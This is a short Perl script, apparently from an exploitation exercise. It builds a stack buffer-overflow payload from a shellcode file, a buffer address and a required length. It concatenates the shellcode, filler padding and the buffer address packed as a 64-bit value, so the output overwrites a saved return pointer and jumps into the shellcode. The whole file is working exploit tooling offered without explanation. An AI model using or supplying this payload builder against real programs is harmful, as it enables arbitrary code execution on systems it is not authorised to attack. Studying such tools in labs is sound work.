#!/usr/bin/env perl

use strict;
use warnings;
use File::Slurp qw/read_file/;

my $USAGE = <<END;
  $0 <shellcode_file> <buffer_addr> <stack_length>
END

my $shell_file      = shift or die $USAGE;
my $buf_start       = shift or die $USAGE;
my $required_length = shift or die $USAGE;

my $shellcode = read_file( $shell_file );

warn hex( $buf_start ), ":", $required_length;

my $padding = "0" x ( $required_length - length($shellcode) + 8);
my $buf_start_le = pack("Q", hex( $buf_start ) );

warn "len = $required_length";

print $shellcode, $padding, $buf_start_le;


